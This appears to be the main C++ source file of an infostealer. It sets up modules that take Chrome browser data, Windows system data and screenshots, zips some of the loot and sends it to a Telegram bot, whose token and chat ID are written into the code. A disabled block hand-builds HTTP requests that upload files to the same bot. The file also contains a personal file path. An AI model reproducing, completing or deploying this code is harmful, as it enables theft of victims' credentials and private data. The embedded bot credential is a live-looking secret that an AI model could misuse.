#include <iostream>

#include "net.h"

#include <filesystem>
#include <fstream>
#include <queue>
#include <syncstream>
#include <functional>

#include <boost/cobalt.hpp>

#include "messages/text_message.h"
#include "senders/sender.h"
#include "senders/telegram_sender.h"
#include "stealers/base_stealer.h"
#include "stealers/chrome_stealer.h"
#include "stealers/srceenshot_stealer.h"
#include "stealers/win_stealer.h"
#include "stealers/zip_stealer.h"

#if 0
http::request<http::string_body> prepare_request(const json::object& obj)
{
    http::request<http::string_body> req;
    req.method(http::verb::post);
    req.version(11);
    req.set(http::field::host, "api.telegram.org");
    req.set(http::field::content_type, "application/json");
    req.set(http::field::accept, "application/json");
    req.set(http::field::connection, "close");
    req.target("/bot6920020229:AAFsRJR5WUZcWk5StJxYdZPTQdBXB6vvLt0/sendMessage");
    req.body() = json::serialize(obj);
    req.prepare_payload();

    return req;
}

auto prepare_request_for_picture(const json::object& obj)
{
    http::request<http::string_body> req;
    req.method(http::verb::post);
    req.version(11);
    req.set(http::field::host, "api.telegram.org");
    req.set(http::field::content_type, "multipart/form-data; boundary=boundary");
    req.set(http::field::accept, "*/*");
    req.set(http::field::connection, "close");
    req.target("/bot6920020229:AAFsRJR5WUZcWk5StJxYdZPTQdBXB6vvLt0/sendPhoto");

    // Construct the multipart form data
    std::ostringstream oss;
    oss << "--boundary\r\n";
    oss << "Content-Disposition: form-data; name=\"chat_id\"\r\n";
    oss << "Content-Type: text/plain\r\n\r\n";
    oss << "515352778" << "\r\n";
    oss << "--boundary\r\n";
    oss << "Content-Disposition: form-data; name=\"photo\"; filename=\"" << std::filesystem::path(R"(C:\Users\Nazariy\Pictures\asdasd.png)").filename().string() << "\"\r\n";
    oss << "Content-Type: image/png\r\n\r\n";

    // Read the photo file and append its content to the multipart data
    std::ifstream ifs(R"(C:\Users\Nazariy\Pictures\asdasd.png)", std::ios::binary);
    if (!ifs.is_open()) {
        //BOOST_LOG_TRIVIAL(error) << "Error opening photo file: " << photo_path;
        return req;
    }
    std::string content;
    content.assign((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    oss << content << "\r\n";
    oss << "--boundary--\r\n";

    // Set the HTTP request body and content length
    req.body() = oss.str();
    req.content_length(req.body().size());

    return req;
}

int main() try
{
    asio::io_context io_context;
    ssl::context ssl_context(asio::ssl::context::sslv23_client);
    ssl_socket socket(io_context, ssl_context);

    tcp::resolver resolver(io_context);
    auto it = resolver.resolve({"api.telegram.org", "443"});
    asio::connect(socket.lowest_layer(), it);

    socket.handshake(ssl::stream_base::handshake_type::client);

    json::object req_body;
    req_body["chat_id"] = "515352778";
    req_body["photo"] = R"(C:\Users\Nazariy\Pictures\asdasd.png)";

    auto req = prepare_request_for_picture(req_body);

    http::write(socket, req);

    beast::flat_buffer buffer;
    http::response<http::dynamic_body> res;
    res.set(http::field::content_type, "application/json");
    http::read(socket, buffer, res);

    const auto body = beast::buffers_to_string(res.body().data());
    std::cout << "Response received: '" << body << "'\n";

    return 0;
} catch (std::exception& ex)
{
    std::cerr << ex.what() << "\n";
}

#endif

asio::awaitable<void> co_main()
{
    auto io_context = co_await asio::this_coro::executor;

    std::unique_ptr<sender_t> sender{
        new telegram_sender_t{
            "6920020229:AAFsRJR5WUZcWk5StJxYdZPTQdBXB6vvLt0",
            "515352778"
        }
    };

    std::vector<std::unique_ptr<base_stealer_t>> stealers;
    stealers.emplace_back(std::make_unique<srceenshot_stealer_t>());
    stealers.emplace_back(std::make_unique<win_stealer_t>());

    auto stealers_to_zip = zip_stealer_t::to_zip_t{};
    stealers_to_zip.emplace_back(std::make_unique<chrome_stealer_t>());
    stealers.emplace_back(
        std::make_unique<zip_stealer_t>(
            std::move(stealers_to_zip)
            , net::get_temp_unique_file_path()));

    std::vector<asio::awaitable<void>> tasks;
    for (auto& st : stealers)
    {
        auto func = [&sender](decltype(st)& st) -> asio::awaitable<void>
        {
            const auto result = co_await st->steal();
            const auto response = co_await sender->send_message(result);
            if (!response.at("ok").as_bool())
                DLOG(response.at("description").as_string());
        };

        tasks.push_back(func(st));
    }

    co_await net::wait(tasks.begin(), tasks.end());

    DLOG("DONE");
}

int main()
{
    srand(time(NULL));
    asio::io_context io_context;

    asio::co_spawn(io_context, co_main(), asio::detached);

    asio::io_context::work idle_work{io_context};
    io_context.run();

    return 0;
}
